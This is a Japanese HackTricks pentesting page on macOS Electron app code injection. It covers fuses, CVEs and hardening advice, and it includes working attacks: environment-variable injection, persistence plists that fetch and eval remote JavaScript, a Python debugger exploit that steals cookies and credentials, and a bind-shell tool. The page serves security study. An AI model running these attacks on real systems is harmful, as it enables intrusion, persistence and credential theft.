# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Electronが何か知らない場合は、[**こちらにたくさんの情報があります**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)。しかし、今はElectronが**node**を実行することだけを知っておいてください。\
そしてnodeには、指定されたファイル以外の**コードを実行させるために使用できる**いくつかの**パラメータ**と**環境変数**があります。

### Electron Fuses

これらの技術については次に説明しますが、最近Electronはそれらを防ぐためにいくつかの**セキュリティフラグ**を追加しました。これらが**Electron Fuses**であり、macOSのElectronアプリが**任意のコードを読み込むのを防ぐために使用される**ものです：

- **`RunAsNode`**: 無効にすると、コードを注入するための環境変数**`ELECTRON_RUN_AS_NODE`**の使用が防止されます。
- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`や`--inspect-brk`のようなパラメータが尊重されません。この方法でコードを注入するのを避けます。
- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた**`asar`** **ファイル**がmacOSによって**検証**されます。この方法でこのファイルの内容を変更することによる**コード注入**を防ぎます。
- **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序で読み込むのではなく：**`app.asar`**、**`app`**、そして最後に**`default_app.asar`**。app.asarのみをチェックして使用するため、**`embeddedAsarIntegrityValidation`**フューズと組み合わせることで**検証されていないコードを読み込むことが不可能**になります。
- **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、ブラウザプロセスは`browser_v8_context_snapshot.bin`というファイルをV8スナップショットに使用します。

コード注入を防がないもう一つの興味深いフューズは：

- **EnableCookieEncryption**: 有効にすると、ディスク上のクッキーストアはOSレベルの暗号化キーを使用して暗号化されます。

### Electron Fusesの確認

アプリケーションからこれらのフラグを**確認することができます**：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuseの変更

[**ドキュメントに記載されているように**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electron Fuse**の設定は、**Electronバイナリ**内にあり、どこかに文字列**`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**が含まれています。

macOSアプリケーションでは、通常、`application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`にあります。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
このファイルを[https://hexed.it/](https://hexed.it/)にロードし、前の文字列を検索できます。この文字列の後に、各ヒューズが無効または有効であることを示すASCIIの数字「0」または「1」が表示されます。ヒューズの値を**変更する**には、16進数コード（`0x30`は`0`、`0x31`は`1`）を変更してください。

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

**`Electron Framework`**バイナリをこれらのバイトを変更してアプリケーション内に**上書き**しようとすると、アプリは実行されないことに注意してください。

## ElectronアプリケーションへのRCEコード追加

Electronアプリが使用している**外部JS/HTMLファイル**がある可能性があるため、攻撃者はこれらのファイルにコードを注入し、その署名がチェックされずにアプリのコンテキストで任意のコードを実行できます。

> [!CAUTION]
> ただし、現時点では2つの制限があります：
>
> - アプリを変更するには**`kTCCServiceSystemPolicyAppBundles`**権限が**必要**であり、デフォルトではこれがもはや可能ではありません。
> - コンパイルされた**`asap`**ファイルは通常、ヒューズ**`embeddedAsarIntegrityValidation`**および**`onlyLoadAppFromAsar`**が**有効**です。
>
> これにより、この攻撃経路はより複雑（または不可能）になります。

**`kTCCServiceSystemPolicyAppBundles`**の要件を回避することは可能で、アプリケーションを別のディレクトリ（例えば**`/tmp`**）にコピーし、フォルダー**`app.app/Contents`**の名前を**`app.app/NotCon`**に変更し、**悪意のある**コードで**asar**ファイルを**変更**し、再び**`app.app/Contents`**に名前を戻して実行することができます。

asarファイルからコードを展開するには、次のコマンドを使用できます：
```bash
npx asar extract app.asar app-decomp
```
そして、次のように修正した後に再パッケージしてください：
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with ELECTRON_RUN_AS_NODE

According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)、この環境変数が設定されている場合、プロセスは通常のNode.jsプロセスとして開始されます。
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> フューズ **`RunAsNode`** が無効になっている場合、環境変数 **`ELECTRON_RUN_AS_NODE`** は無視され、この方法は機能しません。

### アプリのPlistからのインジェクション

[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、この環境変数をplistで悪用して永続性を維持することができます：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

ペイロードを別のファイルに保存し、実行することができます:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> フューズ **`EnableNodeOptionsEnvironmentVariable`** が **無効** の場合、アプリは起動時に環境変数 **NODE_OPTIONS** を **無視** します。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合は、フューズ **`RunAsNode`** が無効であれば、これも **無視** されます。
>
> **`ELECTRON_RUN_AS_NODE`** を設定しないと、次の **エラー** が表示されます: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### アプリのPlistからのインジェクション

これらのキーを追加することで、plist内のこの環境変数を悪用して永続性を維持できます:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE with inspecting

According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), Electronアプリケーションを**`--inspect`**、**`--inspect-brk`**、および**`--remote-debugging-port`**のようなフラグで実行すると、**デバッグポートが開かれ**、それに接続できるようになります（例えば、`chrome://inspect`のChromeから）し、**コードを注入したり**、新しいプロセスを起動したりすることができます。\
例えば:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**このブログ投稿**](https://hackerone.com/reports/1274695)では、このデバッグが悪用されて、ヘッドレスChromeが**任意のファイルを任意の場所にダウンロード**します。

> [!TIP]
> アプリが`--inspect`のような環境変数やパラメータをチェックする独自の方法を持っている場合、`--inspect-brk`という引数を使用して実行時に**バイパス**を試みることができます。これにより、アプリの最初で**実行を停止**し、バイパスを実行します（例えば、現在のプロセスの引数や環境変数を上書きすること）。

以下は、`--inspect-brk`というパラメータでアプリを監視および実行することで、カスタム保護をバイパスすることが可能だったエクスプロイトです（プロセスのパラメータを上書きして`--inspect-brk`を削除）し、その後、JSペイロードを注入してアプリからクッキーや認証情報をダンプしました：
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> フューズ **`EnableNodeCliInspectArguments`** が無効になっている場合、アプリは起動時にノードパラメータ（`--inspect` など）を **無視**します。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合は、これもフューズ **`RunAsNode`** が無効になっていると **無視**されます。
>
> しかし、**electron パラメータ `--remote-debugging-port=9229`** を使用することで、Electronアプリから**履歴**（GETコマンドを使用）や**クッキー**を盗むことが可能ですが、前のペイロードは他のプロセスを実行するためには機能しません。

パラメータ **`--remote-debugging-port=9222`** を使用することで、Electronアプリから**履歴**（GETコマンドを使用）や**クッキー**を盗むことが可能です（クッキーはブラウザ内で**復号化**され、**jsonエンドポイント**がそれらを提供します）。

その方法については[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学ぶことができ、また自動ツール[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)や、次のようなシンプルなスクリプトを使用できます:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

この環境変数をplistで悪用して、次のキーを追加することで永続性を維持できます:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCCバイパス：古いバージョンの悪用

> [!TIP]
> macOSのTCCデーモンは、実行されるアプリケーションのバージョンをチェックしません。したがって、**以前の技術を使用してElectronアプリケーションにコードを注入できない場合**、APPの以前のバージョンをダウンロードしてその上にコードを注入することができます。そうすれば、TCCの権限を取得できます（Trust Cacheがそれを防がない限り）。

## 非JSコードの実行

前述の技術を使用すると、**Electronアプリケーションのプロセス内でJSコードを実行**できます。ただし、**子プロセスは親アプリケーションと同じサンドボックスプロファイルの下で実行され**、**TCCの権限を継承します**。\
したがって、例えばカメラやマイクへのアクセスを悪用したい場合は、**プロセスから別のバイナリを実行するだけで済みます**。

## 注目すべきElectron macOSの脆弱性（2023-2024）

### CVE-2023-44402 – ASAR整合性バイパス

Electron ≤22.3.23およびさまざまな23-27のプレリリースは、`.app/Contents/Resources`フォルダーへの書き込みアクセスを持つ攻撃者が`embeddedAsarIntegrityValidation` **および** `onlyLoadAppFromAsar`のフューズをバイパスできることを許可しました。このバグは、整合性チェッカーにおける*ファイルタイプの混乱*であり、検証されたアーカイブの代わりに**`app.asar`という名前のディレクトリ**が読み込まれることを許可しました。そのため、そのディレクトリ内に配置されたJavaScriptはアプリが起動するときに実行されました。ハードニングガイダンスに従い、両方のフューズを有効にしたベンダーでさえ、macOS上では依然として脆弱でした。

パッチが適用されたElectronバージョン：**22.3.24**、**24.8.3**、**25.8.1**、**26.2.1**および**27.0.0-alpha.7**。古いビルドを実行しているアプリケーションを見つけた攻撃者は、`Contents/Resources/app.asar`を自分のディレクトリで上書きして、アプリケーションのTCC権限でコードを実行できます。

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVEクラスター

2024年1月、一連のCVE（CVE-2024-23738からCVE-2024-23743）が、数多くのElectronアプリがフューズ**RunAsNode**および**EnableNodeCliInspectArguments**をまだ有効にして出荷されていることを明らかにしました。したがって、ローカル攻撃者は環境変数`ELECTRON_RUN_AS_NODE=1`や`--inspect-brk`などのフラグを使用してプログラムを再起動し、*一般的な* Node.jsプロセスに変換し、アプリケーションのサンドボックスおよびTCC権限をすべて継承できます。

Electronチームは「クリティカル」評価に異議を唱え、攻撃者がすでにローカルでコード実行を必要とすることを指摘しましたが、この問題はポストエクスプロイト中に依然として価値があります。なぜなら、脆弱なElectronバンドルを*ランドオフ*バイナリに変えるからです。これにより、例えば、連絡先、写真、またはデスクトップアプリに以前に付与された他の機密リソースを読み取ることができます。

Electronのメンテナからの防御ガイダンス：

* 本番ビルドでは`RunAsNode`および`EnableNodeCliInspectArguments`のフューズを無効にします。
* アプリケーションが正当にヘルパーNode.jsプロセスを必要とする場合は、これらのフューズを再度有効にするのではなく、新しい**UtilityProcess** APIを使用してください。

## 自動注入

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

ツール[**electroniz3r**](https://github.com/r3ggi/electroniz3r)は、**脆弱なElectronアプリケーション**を見つけてコードを注入するために簡単に使用できます。このツールは、**`--inspect`**技術を使用しようとします：

自分でコンパイルする必要があり、次のように使用できます：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Lokiは、ElectronアプリケーションのJavaScriptファイルをLokiコマンド＆コントロールJavaScriptファイルに置き換えることで、バックドアを設計しました。

## References

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
